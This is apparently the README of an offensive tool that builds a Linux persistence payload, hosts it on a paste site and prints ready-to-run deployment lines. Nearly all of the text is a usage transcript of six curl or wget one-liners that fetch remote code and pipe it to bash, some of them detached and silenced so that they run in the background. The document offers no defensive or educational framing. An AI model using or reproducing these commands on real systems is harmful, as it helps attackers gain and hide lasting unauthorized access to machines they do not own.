# l1nux-persistence-module
**A fast deploy script, aimed for establishing persistent access inside a Linux machine.**

### How to use
```
$ python3 generate_script.py --url http://localhost/implant.elf
[*](12:17:42)-[ Info ]----> Loading template..
[*](12:17:42)-[ Info ]----> Setting loaded template..
[*](12:17:42)-[ Info ]----> Creating paste for payload deployment
[*](12:17:45)-[ Info ]----> Pastebin URL: https://paste.rs/bvJUQ
[+](12:17:45)-[ Success ]-> timeout 30 curl -sSL https://paste.rs/bvJUQ|bash
[+](12:17:45)-[ Success ]-> nohup bash -c 'curl -sSL https://paste.rs/bvJUQ|bash' &>/dev/null & disown
[+](12:17:45)-[ Success ]-> cd /tmp;curl -sSLo prsist.sh https://paste.rs/bvJUQ;chmod +x prsist.sh;./prsist.sh

[+](12:17:45)-[ Success ]-> timeout 30 wget -qO- https://paste.rs/bvJUQ|bash
[+](12:17:45)-[ Success ]-> nohup bash -c 'wget -qO- https://paste.rs/bvJUQ|bash' &>/dev/null & disown
[+](12:17:45)-[ Success ]-> cd /tmp;wget -qO prsist.sh https://paste.rs/bvJUQ;chmod +x prsist.sh;./prsist.sh
```
